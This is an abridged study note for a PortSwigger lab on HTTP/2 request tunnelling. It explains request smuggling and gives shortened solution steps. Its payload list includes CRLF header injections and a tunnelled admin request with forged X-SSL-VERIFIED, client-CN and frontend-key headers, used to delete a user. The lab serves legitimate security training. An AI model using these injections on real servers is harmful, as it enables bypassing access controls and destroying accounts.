# Lab: Bypassing access controls via HTTP/2 request tunnelling

**Official lab:** [https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling)

## Lab idea

This lab introduces HTTP/2 request tunnelling, where header handling during downgrade can expose backend functionality despite connection-reuse assumptions. It practices assessing access-control boundaries across proxy and application layers.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Send the GET / request to Burp Repeater.
2. Using the Inspector, append an arbitrary header to the end of the request and try smuggling a Host header in its name as follows: Name foo: bar \r\n Host: abc Value xyz Observe that the…
3. In the browser, notice that the lab's search function reflects your search query in the response.
4. In Burp Repeater, right-click on the request and select Change request method .
- …
6. Change the :path pseudo-header so that it points to an endpoint that returns a shorter resource.
7. Send the request again.
8. In the response, find the URL for deleting carlos ( /admin/delete?username=carlos ), then update the path in your tunnelled request accordingly and resend it.

## Payloads / key values
- `GET /`
- `Host`
- `foo: bar \r\n Host: abc`
- `xyz`
- `GET /?search=YOUR-SEARCH-QUERY`
- `search`
- `POST`
- `Content-Length`
- `foo: bar \r\n Content-Length: 500 \r\n \r\n search=x`
- `0 search results for 'x: xyz Content-Length: 644 cookie: session=YOUR-SESSION-COOKIE X-SSL-VERIFIED: 0 X-SSL-CLIENT-CN: null X-FRONTEND-KEY: YOUR-UNIQUE-KEY`
- `HEAD`
- `foo: bar \r\n \r\n GET /admin HTTP/1.1 \r\n X-SSL-VERIFIED: 1 \r\n X-SSL-CLIENT-CN: administrator \r\n X-FRONTEND-KEY: YOUR-UNIQUE-KEY \r\n \r\n`
- `:path`
- `/login`
- `carlos`
- `/admin/delete?username=carlos`

## Official source
- [PortSwigger Academy: Lab: Bypassing access controls via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling)
